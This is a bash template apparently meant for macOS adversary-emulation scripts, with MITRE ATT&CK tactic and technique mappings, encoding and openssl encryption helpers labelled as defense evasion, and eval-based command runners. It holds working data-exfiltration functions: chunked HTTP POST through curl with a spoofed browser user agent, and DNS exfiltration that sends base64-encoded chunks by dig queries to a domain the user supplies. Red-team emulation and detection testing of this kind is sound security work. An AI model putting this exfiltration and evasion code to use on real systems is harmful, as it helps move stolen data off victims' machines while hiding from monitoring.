# Script Name: [TECHNIQUE_NAME]
# MITRE ATT&CK Technique: [TECHNIQUE_ID]
# Author: [YOUR_NAME]
# Date: $(date +%Y-%m-%d)
# Version: 1.0

# Description:
# [Brief description of what the script does and its purpose]

# References:
# - [URL to MITRE ATT&CK technique]
# - [Any other relevant references]

# MITRE ATT&CK Mappings
TACTIC="[Your Tactic]"
TTP_ID="[Your TTP ID]"

TACTIC_EXFIL="Exfiltration"
TTP_ID_EXFIL="T1041"

TACTIC_ENCRYPT="Defense Evasion"
TTP_ID_ENCRYPT="T1027"

TACTIC_ENCODE="Defense Evasion"
TTP_ID_ENCODE="T1140"

TTP_ID_ENCODE_BASE64="T1027.001"
TTP_ID_ENCODE_STEGANOGRAPHY="T1027.003"
TTP_ID_ENCODE_PERL="T1059.006"

# Global Variables
NAME="[TECHNIQUE_NAME]"
VERBOSE=false
LOG_ENABLED=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
ENCRYPT="none"
ENCRYPT_KEY=""
CHUNK_SIZE=1000  # Default chunk size
LOG_DIR="../../logs"
LOG_FILE="${LOG_DIR}/[TECHNIQUE_ID]_[TECHNIQUE_NAME].log"

# Command Input Variables
ACCOUNT=""
USER=""
GROUP=""
SERVICE=""
FILE=""
DIR=""
SERVER=""
URL=""
OUTPUT_FILE=""
HOSTNAME=""
SRC_IP=""
DST_IP=""
IPADDR=""
PORT=""
PROTOCOL=""
PROCESS_NAME=""
PID=""
APP_NAME=""
VOLUME=""
DEVICE=""
INTERFACE=""
SSID=""
NETWORK_NAME=""
TIMESTAMP=""
DATE_START=""
DATE_END=""
KEYCHAIN_PATH=""
CERTIFICATE_NAME=""
PACKAGE_NAME=""
BUNDLE_ID=""
PLIST_PATH=""
COMMAND=""
SCRIPT_PATH=""
LOG_LEVEL=""
TIMEOUT=""
RETRY_COUNT=""
INTERVAL=""
THRESHOLD=""
REGEX_PATTERN=""
HASH_VALUE=""
KEY=""
VALUE=""
FORMAT=""
ENCODING=""
COMPRESSION=""
ARCHIVE_NAME=""
VERSION=""
LANGUAGE=""
LOCALE=""
TIMEZONE=""

# Use an associative array for storing commands
declare -A COMMANDS
COMMANDS[cmd1]='[Command for cmd1]'
COMMANDS[cmd2]='[Command for cmd2]'
COMMANDS[cmd3]='[Command for cmd3]'
# Add more commands as needed

# MITRE ATT&CK Tactic to Function Name Prefix Mapping
declare -A TACTIC_PREFIXES=(
    ["Reconnaissance"]="recon"
    ["Resource Development"]="develop"
    ["Initial Access"]="access"
    ["Execution"]="execute"
    ["Persistence"]="persist"
    ["Privilege Escalation"]="escalate"
    ["Defense Evasion"]="evade"
    ["Credential Access"]="access_cred"
    ["Discovery"]="discover"
    ["Lateral Movement"]="move"
    ["Collection"]="collect"
    ["Command and Control"]="command"
    ["Exfiltration"]="exfiltrate"
    ["Impact"]="impact"
)

# Function to generate TTP execution functions
generate_ttp_functions() {
    for tactic in "${!TACTIC_PREFIXES[@]}"; do
        local prefix="${TACTIC_PREFIXES[$tactic]}"
        local function_name="${prefix}_${NAME}"
        eval "
        #FunctionType: attackScript
        ${function_name}() {
            local cmd_key=\"\$1\"
            local cmd=\"\${COMMANDS[\$cmd_key]}\"
            if [ -z \"\$cmd\" ]; then
                echo \"Unknown command: \$cmd_key\" >&2
                return 1
            fi
            log_to_stdout \"Executing $tactic technique: \$cmd_key\" \"${function_name}\" \"\$cmd\"
            eval \"\$cmd\" 2>&1 || echo \"Command failed: \$cmd\" >&2
        }
        "
        COMMANDS["${function_name}"]="${function_name}"
    done
}

# Generate TTP execution functions
generate_ttp_functions

# Update execute_ttp function
#FunctionType: attackScript
execute_ttp() {
    local ttp_type="$1"
    shift
    local output=""

    if [[ "${COMMANDS[$ttp_type]}" ]]; then
        output+=$(eval "${COMMANDS[$ttp_type]}" "$@")
    else
        output+="Unknown TTP type: $ttp_type\n"
    fi

    echo "$output"
}

#FunctionType: utility
display_help() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Description:"
    echo "  [Brief description of the script's functionality]"
    echo ""
    echo "Options:"
    echo "  General:"
    echo "    --help                 Show this help message"
    echo "    --verbose              Enable detailed output"
    echo "    --log                  Log output to file (rotates at 5MB)"
    echo ""
    echo "  Specific Checks:"
    echo "    --cmd1               Perform cmd1"
    echo "    --cmd2               Perform cmd2"
    echo "    --cmd3               Perform cmd3"
    echo ""
    echo "  Output Processing:"
    echo "    --encode=TYPE          Encode output (b64|hex|perl_b64|perl_utf8)"
    echo "    --encrypt=METHOD       Encrypt output using openssl (generates random key)"
    echo ""
    echo "  Data Exfiltration:"
    echo "    --exfil=URI            Exfil via HTTP POST using curl (RFC 7231)"
    echo "    --exfil=dns=DOMAIN     Exfil via DNS TXT queries using dig (RFC 1035)"
    echo "    --chunksize=SIZE       Set the chunk size for HTTP exfiltration (100-10000 bytes, default 1000)"
}

#FunctionType: utility
get_timestamp() {
    date +"%Y-%m-%d %H:%M:%S"
}

#FunctionType: utility
log_to_stdout() {
    local msg="$1"
    local function_name="$2"
    local command="$3"
    local timestamp=$(get_timestamp)
    local log_entry="[${timestamp}]: user: $USER; ttp_id: $TTP_ID; tactic: $TACTIC; msg: $msg; function: $function_name; command: \"$command\""
    
    echo "$log_entry"
    
    if [ "$LOG_ENABLED" = true ]; then
        echo "$log_entry" >> "$LOG_FILE"
    fi
}

#FunctionType: utility
setup_log() {
    local script_name=$(basename "$0" .sh)
    touch "$LOG_FILE"
}

#FunctionType: utility
log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    
    if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        setup_log
    fi
    
    echo "$output" >> "$LOG_FILE"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        mv "$LOG_FILE" "${LOG_FILE}.old"
        setup_log
    fi
}

#FunctionType: utility
chunk_data() {
    local data="$1"
    local chunk_size="$2"
    local output=""
    
    while [ -n "$data" ]; do
        output+="${data:0:$chunk_size}"$'\n'
        data="${data:$chunk_size}"
    done
    
    echo "$output"
}

#FunctionType: utility
encode_output() {
    local data="$1"
    local original_ttp_id=$TTP_ID
    local original_tactic=$TACTIC

    case $ENCODE in
        b64)
            TTP_ID=$TTP_ID_ENCODE_BASE64
            TACTIC=$TACTIC_ENCODE
            log_to_stdout "Encoded output using Base64" "encode_output" "base64"
            echo "$data" | base64
            ;;
        hex)
            TTP_ID=$TTP_ID_ENCODE
            TACTIC=$TACTIC_ENCODE
            log_to_stdout "Encoded output using Hex" "encode_output" "xxd -p"
            echo "$data" | xxd -p
            ;;
        perl_b64)
            TTP_ID=$TTP_ID_ENCODE_PERL
            TACTIC="Execution"
            log_to_stdout "Encoded output using Perl Base64" "encode_output" "perl -MMIME::Base64 -e 'print encode_base64(\"$data\");'"
            perl -MMIME::Base64 -e "print encode_base64(\"$data\");"
            ;;
        perl_utf8)
            TTP_ID=$TTP_ID_ENCODE_PERL
            TACTIC="Execution"
            log_to_stdout "Encoded output using Perl UTF-8" "encode_output" "perl -e 'print \"$data\".encode(\"UTF-8\");'"
            perl -e "print \"$data\".encode(\"UTF-8\");"
            ;;
        *)
            echo "Unknown encoding type: $ENCODE" >&2
            return 1
            ;;
    esac

    TTP_ID=$original_ttp_id
    TACTIC=$original_tactic
}

#FunctionType: utility
encrypt_output() {
    local data="$1"
    openssl enc -"$ENCRYPT" -base64 -k "$ENCRYPT_KEY" <<< "$data"
}

#FunctionType: utility
validate_input() {
    local input="$1"
    local pattern="$2"
    if [[ ! $input =~ $pattern ]]; then
        echo "Invalid input: $input" >&2
        return 1
    fi
    return 0
}

#FunctionType: utility
sanitize_input() {
    local input="$1"
    echo "$input" | sed 's/[;&|]//g'
}

#FunctionType: utility
execute_command() {
    local cmd_key="$1"
    shift
    local cmd="${COMMANDS[$cmd_key]}"
    
    if [ -z "$cmd" ]; then
        echo "Unknown command: $cmd_key" >&2
        return 1
    fi
    
    if [[ "$cmd" == cmd_no_args* ]]; then
        eval "${cmd#cmd_no_args }" 2>&1 || echo "Command failed: $cmd" >&2
    elif [[ "$cmd" == cmd_with_args* ]]; then
        eval "${cmd#cmd_with_args } $@" 2>&1 || echo "Command failed: $cmd $@" >&2
    else
        echo "Invalid command type for $cmd_key" >&2
        return 1
    fi
}

#FunctionType: attackScript
exfil_http() {
    local data="$1"
    local url="$2"
    local og_ttp="$TTP_ID"
    TTP_ID="$TTP_ID_EXFIL"

    log_to_stdout "Starting HTTP exfil" "exfil_http" "curl $url"
    
    local chunks=$(chunk_data "$data" "$CHUNK_SIZE")
    local total=$(echo "$chunks" | wc -l)
    local count=1

    echo "$chunks" | while IFS= read -r chunk; do
        local size=${#chunk}
        log_to_stdout "Sending chunk $count/$total ($size bytes)" "exfil_http" "curl $url"
        
        if curl -L -s -X POST -d "$chunk" "$url" -H "User-Agent: $USER_AGENT" --insecure -o /dev/null -w "%{http_code}" | grep -q "^2"; then
            log_to_stdout "Chunk $count/$total sent" "exfil_http" "curl $url"
        else
            log_to_stdout "Chunk $count/$total failed" "exfil_http" "curl $url"
            TTP_ID="$og_ttp"
            return 1
        fi
        count=$((count + 1))
    done

    log_to_stdout "HTTP exfil complete" "exfil_http" "curl $url"
    TTP_ID="$og_ttp"
    return 0
}

#FunctionType: attackScript
exfil_dns() {
    local data="$1"
    local domain="$2"
    local id="$3"
    local original_ttp_id=$TTP_ID
    TTP_ID=$TTP_ID_EXFIL

    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
    local dns_chunk_size=63  # Fixed max length of a DNS label

    log_to_stdout "Attempting to exfiltrate data via DNS" "exfil_dns" "dig +short ${encoded_id}.id.$domain"

    # Send the ID first
    if ! dig +short "${encoded_id}.id.$domain" A > /dev/null; then
        log_to_stdout "Failed to send ID via DNS" "exfil_dns" "dig +short ${encoded_id}.id.$domain"
        TTP_ID=$original_ttp_id
        return 1
    fi

    local chunks=$(chunk_data "$encoded_data" "$dns_chunk_size")
    local total_chunks=$(echo "$chunks" | wc -l)
    local chunk_num=0

    echo "$chunks" | while IFS= read -r chunk; do
        if dig +short "${chunk}.${chunk_num}.$domain" A > /dev/null; then
            log_to_stdout "Successfully sent chunk $((chunk_num+1))/$total_chunks via DNS" "exfil_dns" "dig +short ${chunk}.${chunk_num}.$domain"
        else
            log_to_stdout "Failed to send chunk $((chunk_num+1))/$total_chunks via DNS" "exfil_dns" "dig +short ${chunk}.${chunk_num}.$domain"
            TTP_ID=$original_ttp_id
            return 1
        fi
        chunk_num=$((chunk_num+1))
    done

    if dig +short "end.$domain" A > /dev/null; then
        log_to_stdout "Successfully completed DNS exfiltration" "exfil_dns" "dig +short end.$domain"
        TTP_ID=$original_ttp_id
        return 0
    else
        log_to_stdout "Failed to send end signal via DNS" "exfil_dns" "dig +short end.$domain"
        TTP_ID=$original_ttp_id
        return 1
    fi
}

#FunctionType: attackScript
cmd_no_args() {
    log_to_stdout "Executing command with no args" "cmd_no_args" "$1"
    eval "$1"
}

#FunctionType: attackScript
cmd_with_args() {
    local command="$1"
    shift
    log_to_stdout "Executing command with args" "cmd_with_args" "$command $*"
    eval "$command $*"
}

# Example usage in the COMMANDS array
COMMANDS[ls_app_files]='cmd_no_args "ls -laR /Applications/"'
COMMANDS[ps_grep]='cmd_with_args "ps -axrww | grep -v grep | grep --color=always"'

# Parse command-line arguments
while [ "$#" -gt 0 ]; do
    case "$1" in
        --help) display_help; exit 0 ;;
        --verbose) VERBOSE=true ;;
        --log) LOG_ENABLED=true ;;
        --cmd1|--cmd2|--cmd3)
            execute_ttp "${1#--}"
            ;;
        --encode=*)
            ENCODE="${1#*=}"
            if ! validate_input "$ENCODE" "^(b64|hex|perl_b64|perl_utf8)$"; then
                echo "Invalid encoding type: $ENCODE" >&2
                exit 1
            fi
            ;;
        --encrypt=*)
            ENCRYPT="${1#*=}"
            if ! validate_input "$ENCRYPT" "^[a-zA-Z0-9_-]+$"; then
                echo "Invalid encryption method: $ENCRYPT" >&2
                exit 1
            fi
            ENCRYPT_KEY=$(openssl rand -base64 32 | tr -d '\n/')
            ;;
        --exfil=*)
            EXFIL=true
            EXFIL_METHOD="${1#*=}"
            EXFIL_URI="${1#*=dns=}"
            if ! validate_input "$EXFIL_METHOD" "^(http://|https://|dns=)[a-zA-Z0-9.-]+"; then
                echo "Invalid exfiltration method: $EXFIL_METHOD" >&2
                exit 1
            fi
            ;;
        --chunksize=*)
            CHUNK_SIZE="${1#*=}"
            if ! validate_input "$CHUNK_SIZE" "^[0-9]+$"; then
                echo "Invalid chunk size: $CHUNK_SIZE" >&2
                exit 1
            fi
            ;;
        *) echo "Unknown option: $1" >&2; display_help; exit 1 ;;
    esac
    shift
done

main() {
    local output=""
    
    if [ -n "$output" ]; then
        if [ "$ENCODE" != "none" ]; then
            encoded_output=$(encode_output "$output")
        fi

        if [ "$ENCRYPT" != "none" ]; then
            encrypted_output=$(encrypt_output "${encoded_output:-$output}")
        fi

        if [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ]; then
            log_output "${encrypted_output:-${encoded_output:-$output}}"
        elif [ "$LOG_ENABLED" != true ]; then
            echo "${encrypted_output:-${encoded_output:-$output}}"
        fi

        if [ "$EXFIL" = true ]; then
            local exfil_data="${encrypted_output:-${encoded_output:-$output}}"
            if [[ "$EXFIL_METHOD" == http://* ]]; then
                exfil_http "$exfil_data" "$EXFIL_METHOD"
            elif [[ "$EXFIL_METHOD" == dns=* ]]; then
                local domain="${EXFIL_METHOD#dns=}"
                exfil_dns "$exfil_data" "$domain" "$(date +%s)"
            fi
        fi
    else
        echo "No information found"
    fi
}

main